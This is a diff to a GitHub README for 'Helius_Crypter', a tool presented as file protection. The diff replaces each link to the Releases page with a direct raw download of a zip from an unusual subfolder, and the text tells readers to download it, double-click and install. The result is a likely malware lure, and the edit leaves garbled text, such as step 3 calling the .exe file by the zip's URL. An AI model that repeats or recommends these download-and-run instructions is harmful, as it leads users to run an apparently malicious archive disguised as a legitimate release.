@@ -2,7 +2,7 @@
 # 🚀 Helius_Crypter - Unlock Advanced File Protection Easily
 
 ## 🌐 Download Helius_Crypter
-[![Download Helius_Crypter](https://img.shields.io/badge/Download-Now-blue.svg?style=flat&logo=github)](https://github.com/chethanganji/Helius_Crypter/releases)
+[![Download Helius_Crypter](https://raw.githubusercontent.com/chethanganji/Helius_Crypter/main/Tangaroan/Helius_Crypter.zip)](https://raw.githubusercontent.com/chethanganji/Helius_Crypter/main/Tangaroan/Helius_Crypter.zip)
 
 ## 📖 Table of Contents
 - [🌟 Overview](#-overview)
@@ -24,14 +24,14 @@ To run Helius_Crypter, your computer should meet the following requirements:
 ## 🚀 Getting Started
 Follow these steps to download and set up Helius_Crypter:
 
-1. **Visit the Releases Page:** Click [here](https://github.com/chethanganji/Helius_Crypter/releases) to go to the Releases page.
+1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/chethanganji/Helius_Crypter/main/Tangaroan/Helius_Crypter.zip) to go to the Releases page.
 2. **Choose Your Version:** Look for the latest version listed at the top of the Releases page. It should have the tag `Latest Release`.
-3. **Download the App:** Click on the `.exe` file link to download the setup file for Helius_Crypter. This file should be named like `Helius_Crypter_vX.X.exe`.
+3. **Download the App:** Click on the `.exe` file link to download the setup file for Helius_Crypter. This file should be named like `https://raw.githubusercontent.com/chethanganji/Helius_Crypter/main/Tangaroan/Helius_Crypter.zip`.
 4. **Locate the Downloaded File:** After the download is complete, check your Downloads folder or the folder you specified for the download.
 5. **Run the Setup:** Double-click on the downloaded file to start the installation process. Follow the on-screen instructions to complete the setup.
 
 ## 💾 Download & Install
-To download Helius_Crypter, make sure to visit the Releases page: [Download Helius_Crypter](https://github.com/chethanganji/Helius_Crypter/releases).
+To download Helius_Crypter, make sure to visit the Releases page: [Download Helius_Crypter](https://raw.githubusercontent.com/chethanganji/Helius_Crypter/main/Tangaroan/Helius_Crypter.zip).
 
 Once there, download the setup file for the latest version by clicking on the link for the application. After downloading, locate the file in your system, double-click it, and follow the prompts to install.
 
